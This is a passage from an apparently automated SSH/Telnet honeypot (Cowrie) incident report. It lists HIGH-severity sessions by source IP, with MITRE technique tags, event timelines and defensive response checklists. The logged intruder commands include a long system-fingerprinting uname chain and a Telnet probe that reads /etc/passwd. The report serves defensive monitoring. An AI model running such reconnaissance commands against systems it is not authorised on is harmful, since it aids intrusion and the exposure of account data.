- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84a2150ed661

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:37 |
| **Last Seen** | 2026-09-04 07:38 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:37:33` | `cowrie.session.connect` |
| `2026-09-04 07:37:37` | `cowrie.client.version` |
| `2026-09-04 07:37:37` | `cowrie.client.kex` |
| `2026-09-04 07:37:50` | `cowrie.login.success` |
| `2026-09-04 07:37:56` | `cowrie.session.params` |
| `2026-09-04 07:37:56` | `cowrie.command.input` |
| `2026-09-04 07:37:56` | `cowrie.command.input` |
| `2026-09-04 07:37:56` | `cowrie.command.input` |
| `2026-09-04 07:37:56` | `cowrie.command.input` |
| `2026-09-04 07:37:56` | `cowrie.command.input` |
| `2026-09-04 07:37:56` | `cowrie.command.success` |
| `2026-09-04 07:37:56` | `cowrie.command.input` |
| `2026-09-04 07:37:56` | `cowrie.command.input` |
| `2026-09-04 07:37:56` | `cowrie.command.input` |
| `2026-09-04 07:37:56` | `cowrie.command.input` |
| `2026-09-04 07:37:59` | `cowrie.log.closed` |
| `2026-09-04 07:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d7d4c5f470

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:38 |
| **Last Seen** | 2026-09-04 07:38 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:38:25` | `cowrie.session.connect` |
| `2026-09-04 07:38:26` | `cowrie.client.version` |
| `2026-09-04 07:38:26` | `cowrie.client.kex` |
| `2026-09-04 07:38:37` | `cowrie.login.success` |
| `2026-09-04 07:38:44` | `cowrie.session.params` |
| `2026-09-04 07:38:44` | `cowrie.command.input` |
| `2026-09-04 07:38:44` | `cowrie.command.input` |
| `2026-09-04 07:38:44` | `cowrie.command.input` |
| `2026-09-04 07:38:44` | `cowrie.command.input` |
| `2026-09-04 07:38:44` | `cowrie.command.input` |
| `2026-09-04 07:38:44` | `cowrie.command.success` |
| `2026-09-04 07:38:44` | `cowrie.command.input` |
| `2026-09-04 07:38:44` | `cowrie.command.input` |
| `2026-09-04 07:38:44` | `cowrie.command.input` |
| `2026-09-04 07:38:44` | `cowrie.command.input` |
| `2026-09-04 07:38:47` | `cowrie.log.closed` |
| `2026-09-04 07:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1693912ab9b0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:39 |
| **Last Seen** | 2026-09-04 07:39 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:39:18` | `cowrie.session.connect` |
| `2026-09-04 07:39:21` | `cowrie.client.version` |
| `2026-09-04 07:39:21` | `cowrie.client.kex` |
| `2026-09-04 07:39:34` | `cowrie.login.success` |
| `2026-09-04 07:39:41` | `cowrie.session.params` |
| `2026-09-04 07:39:41` | `cowrie.command.input` |
| `2026-09-04 07:39:41` | `cowrie.command.input` |
| `2026-09-04 07:39:41` | `cowrie.command.input` |
| `2026-09-04 07:39:41` | `cowrie.command.input` |
| `2026-09-04 07:39:41` | `cowrie.command.input` |
| `2026-09-04 07:39:41` | `cowrie.command.success` |
| `2026-09-04 07:39:41` | `cowrie.command.input` |
| `2026-09-04 07:39:41` | `cowrie.command.input` |
| `2026-09-04 07:39:41` | `cowrie.command.input` |
| `2026-09-04 07:39:41` | `cowrie.command.input` |
| `2026-09-04 07:39:43` | `cowrie.log.closed` |
| `2026-09-04 07:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09421d6040e0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:40 |
| **Last Seen** | 2026-09-04 07:40 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:40:11` | `cowrie.session.connect` |
| `2026-09-04 07:40:14` | `cowrie.client.version` |
| `2026-09-04 07:40:14` | `cowrie.client.kex` |
| `2026-09-04 07:40:27` | `cowrie.login.success` |
| `2026-09-04 07:40:33` | `cowrie.session.params` |
| `2026-09-04 07:40:33` | `cowrie.command.input` |
| `2026-09-04 07:40:33` | `cowrie.command.input` |
| `2026-09-04 07:40:33` | `cowrie.command.input` |
| `2026-09-04 07:40:33` | `cowrie.command.input` |
| `2026-09-04 07:40:33` | `cowrie.command.input` |
| `2026-09-04 07:40:33` | `cowrie.command.success` |
| `2026-09-04 07:40:33` | `cowrie.command.input` |
| `2026-09-04 07:40:33` | `cowrie.command.input` |
| `2026-09-04 07:40:33` | `cowrie.command.input` |
| `2026-09-04 07:40:33` | `cowrie.command.input` |
| `2026-09-04 07:40:36` | `cowrie.log.closed` |
| `2026-09-04 07:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aca15a48b7ac

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:41 |
| **Last Seen** | 2026-09-04 07:41 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:41:09` | `cowrie.session.connect` |
| `2026-09-04 07:41:12` | `cowrie.client.version` |
| `2026-09-04 07:41:12` | `cowrie.client.kex` |
| `2026-09-04 07:41:25` | `cowrie.login.success` |
| `2026-09-04 07:41:32` | `cowrie.session.params` |
| `2026-09-04 07:41:32` | `cowrie.command.input` |
| `2026-09-04 07:41:32` | `cowrie.command.input` |
| `2026-09-04 07:41:32` | `cowrie.command.input` |
| `2026-09-04 07:41:32` | `cowrie.command.input` |
| `2026-09-04 07:41:32` | `cowrie.command.input` |
| `2026-09-04 07:41:32` | `cowrie.command.success` |
| `2026-09-04 07:41:32` | `cowrie.command.input` |
| `2026-09-04 07:41:32` | `cowrie.command.input` |
| `2026-09-04 07:41:32` | `cowrie.command.input` |
| `2026-09-04 07:41:32` | `cowrie.command.input` |
| `2026-09-04 07:41:35` | `cowrie.log.closed` |
| `2026-09-04 07:41:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02056c8f6b15

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:42 |
| **Last Seen** | 2026-09-04 07:42 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:42:06` | `cowrie.session.connect` |
| `2026-09-04 07:42:10` | `cowrie.client.version` |
| `2026-09-04 07:42:10` | `cowrie.client.kex` |
| `2026-09-04 07:42:23` | `cowrie.login.success` |
| `2026-09-04 07:42:30` | `cowrie.session.params` |
| `2026-09-04 07:42:30` | `cowrie.command.input` |
| `2026-09-04 07:42:30` | `cowrie.command.input` |
| `2026-09-04 07:42:30` | `cowrie.command.input` |
| `2026-09-04 07:42:30` | `cowrie.command.input` |
| `2026-09-04 07:42:30` | `cowrie.command.input` |
| `2026-09-04 07:42:30` | `cowrie.command.success` |
| `2026-09-04 07:42:30` | `cowrie.command.input` |
| `2026-09-04 07:42:30` | `cowrie.command.input` |
| `2026-09-04 07:42:30` | `cowrie.command.input` |
| `2026-09-04 07:42:30` | `cowrie.command.input` |
| `2026-09-04 07:42:33` | `cowrie.log.closed` |
| `2026-09-04 07:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78e694a39cee

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:43 |
| **Last Seen** | 2026-09-04 07:43 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:43:02` | `cowrie.session.connect` |
| `2026-09-04 07:43:04` | `cowrie.client.version` |
| `2026-09-04 07:43:04` | `cowrie.client.kex` |
| `2026-09-04 07:43:14` | `cowrie.login.success` |
| `2026-09-04 07:43:20` | `cowrie.session.params` |
| `2026-09-04 07:43:20` | `cowrie.command.input` |
| `2026-09-04 07:43:20` | `cowrie.command.input` |
| `2026-09-04 07:43:20` | `cowrie.command.input` |
| `2026-09-04 07:43:20` | `cowrie.command.input` |
| `2026-09-04 07:43:20` | `cowrie.command.input` |
| `2026-09-04 07:43:20` | `cowrie.command.success` |
| `2026-09-04 07:43:20` | `cowrie.command.input` |
| `2026-09-04 07:43:20` | `cowrie.command.input` |
| `2026-09-04 07:43:20` | `cowrie.command.input` |
| `2026-09-04 07:43:20` | `cowrie.command.input` |
| `2026-09-04 07:43:23` | `cowrie.log.closed` |
| `2026-09-04 07:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d09cd5c4c49d

| Field | Detail |
|---|---|
| **Source IP** | `196.190.92[.]28` |
| **First Seen** | 2026-09-04 07:43 |
| **Last Seen** | 2026-09-04 07:44 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:43:16` | `cowrie.session.connect` |
| `2026-09-04 07:43:16` | `cowrie.telnet.option` |
| `2026-09-04 07:43:17` | `cowrie.telnet.option` |
| `2026-09-04 07:43:17` | `cowrie.login.success` |
| `2026-09-04 07:43:17` | `cowrie.session.params` |
| `2026-09-04 07:43:17` | `cowrie.telnet.option` |
| `2026-09-04 07:43:17` | `cowrie.telnet.option` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.failed` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.failed` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.failed` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.failed` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.failed` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.failed` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.failed` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.failed` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:43:17` | `cowrie.command.input` |
| `2026-09-04 07:44:18` | `cowrie.log.closed` |
| `2026-09-04 07:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.92[.]28` to AbuseIPDB if not already reported
- [ ] Block `196.190.92[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1cb6293cbe5

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-04 07:43 |
| **Last Seen** | 2026-09-04 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:43:29` | `cowrie.session.connect` |
| `2026-09-04 07:43:29` | `cowrie.client.version` |
| `2026-09-04 07:43:29` | `cowrie.client.kex` |
| `2026-09-04 07:43:30` | `cowrie.login.success` |
| `2026-09-04 07:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c729e627da1

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-04 07:43 |
| **Last Seen** | 2026-09-04 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:43:29` | `cowrie.session.connect` |
| `2026-09-04 07:43:29` | `cowrie.client.version` |
| `2026-09-04 07:43:29` | `cowrie.client.kex` |
| `2026-09-04 07:43:30` | `cowrie.login.success` |
| `2026-09-04 07:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa53e828ea2e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:43 |
| **Last Seen** | 2026-09-04 07:44 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:43:59` | `cowrie.session.connect` |
| `2026-09-04 07:44:02` | `cowrie.client.version` |
| `2026-09-04 07:44:02` | `cowrie.client.kex` |
| `2026-09-04 07:44:10` | `cowrie.login.success` |
| `2026-09-04 07:44:15` | `cowrie.session.params` |
| `2026-09-04 07:44:15` | `cowrie.command.input` |
| `2026-09-04 07:44:15` | `cowrie.command.input` |
| `2026-09-04 07:44:15` | `cowrie.command.input` |
| `2026-09-04 07:44:15` | `cowrie.command.input` |
| `2026-09-04 07:44:15` | `cowrie.command.input` |
| `2026-09-04 07:44:15` | `cowrie.command.success` |
| `2026-09-04 07:44:15` | `cowrie.command.input` |
| `2026-09-04 07:44:15` | `cowrie.command.input` |
| `2026-09-04 07:44:15` | `cowrie.command.input` |
| `2026-09-04 07:44:15` | `cowrie.command.input` |
| `2026-09-04 07:44:18` | `cowrie.log.closed` |
| `2026-09-04 07:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ce6ebb48609

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:44 |
| **Last Seen** | 2026-09-04 07:45 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:44:50` | `cowrie.session.connect` |
| `2026-09-04 07:44:52` | `cowrie.client.version` |
| `2026-09-04 07:44:52` | `cowrie.client.kex` |
| `2026-09-04 07:45:00` | `cowrie.login.success` |
| `2026-09-04 07:45:06` | `cowrie.session.params` |
| `2026-09-04 07:45:06` | `cowrie.command.input` |
| `2026-09-04 07:45:06` | `cowrie.command.input` |
| `2026-09-04 07:45:06` | `cowrie.command.input` |
| `2026-09-04 07:45:06` | `cowrie.command.input` |
| `2026-09-04 07:45:06` | `cowrie.command.input` |
| `2026-09-04 07:45:06` | `cowrie.command.success` |
| `2026-09-04 07:45:06` | `cowrie.command.input` |
| `2026-09-04 07:45:06` | `cowrie.command.input` |
| `2026-09-04 07:45:06` | `cowrie.command.input` |
| `2026-09-04 07:45:06` | `cowrie.command.input` |
| `2026-09-04 07:45:09` | `cowrie.log.closed` |
| `2026-09-04 07:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-848ae4fe86b0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:45 |
| **Last Seen** | 2026-09-04 07:46 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:45:39` | `cowrie.session.connect` |
| `2026-09-04 07:45:41` | `cowrie.client.version` |
| `2026-09-04 07:45:41` | `cowrie.client.kex` |
| `2026-09-04 07:45:51` | `cowrie.login.success` |
| `2026-09-04 07:45:57` | `cowrie.session.params` |
| `2026-09-04 07:45:57` | `cowrie.command.input` |
| `2026-09-04 07:45:57` | `cowrie.command.input` |
| `2026-09-04 07:45:57` | `cowrie.command.input` |
| `2026-09-04 07:45:57` | `cowrie.command.input` |
| `2026-09-04 07:45:57` | `cowrie.command.input` |
| `2026-09-04 07:45:57` | `cowrie.command.success` |
| `2026-09-04 07:45:57` | `cowrie.command.input` |
| `2026-09-04 07:45:57` | `cowrie.command.input` |
| `2026-09-04 07:45:57` | `cowrie.command.input` |
| `2026-09-04 07:45:57` | `cowrie.command.input` |
| `2026-09-04 07:46:00` | `cowrie.log.closed` |
| `2026-09-04 07:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e208070d2a66

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:46 |
| **Last Seen** | 2026-09-04 07:46 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
